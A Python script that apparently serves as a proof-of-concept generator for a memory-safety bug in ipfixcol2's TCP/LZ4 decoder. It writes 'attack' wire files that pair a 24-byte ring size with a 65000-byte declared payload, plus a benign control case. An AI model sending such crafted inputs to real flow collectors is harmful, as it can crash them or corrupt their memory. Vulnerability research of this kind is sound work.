#!/usr/bin/env python3
"""Craft ipfixcol2 TCP/LZ4 wire inputs from the two attacker-controlled
network fields: start-header buffer_size (ring size) and the per-message
decompressed_size / compressed_size. No upstream code is copied here.
"""
from pathlib import Path
import struct
import sys

HERE = Path(__file__).resolve().parent
OUT = HERE / "out"


def lz4_literals(payload: bytes) -> bytes:
    """A single all-literals LZ4 block that decodes to exactly `payload`."""
    n = len(payload)
    block = bytearray([(15 if n >= 15 else n) << 4])
    if n >= 15:
        rem = n - 15
        while rem >= 255:
            block.append(255)
            rem -= 255
        block.append(rem)
    block += payload
    return bytes(block)


def wire(ring: int, declared: int, payload: bytes) -> bytes:
    body = lz4_literals(payload)
    # magic is read but not validated by Lz4Decoder::read_start_header();
    # buffer_size and the two per-message sizes are network byte order.
    return (struct.pack("<I", 0x4C5A3463) + struct.pack(">I", ring)
            + struct.pack(">HH", declared, len(body)) + body)

def main():
    ring = 24
    declared = 65000  # LZ4 block overhead keeps compressed_size <= 65535
    cases = {
        "attack": wire(ring, declared, b"\x5a" * declared),
        "attack_diff": wire(ring, declared, b"\x41" * declared),
        "benign": wire(ring, 8, b"\x5a" * 8),
    }
    for name, data in cases.items():
        (OUT / f"wire-{name}.bin").write_bytes(data)
        print(f"{name}: ring={ring} bytes={len(data)}")


if __name__ == "__main__":
    main()
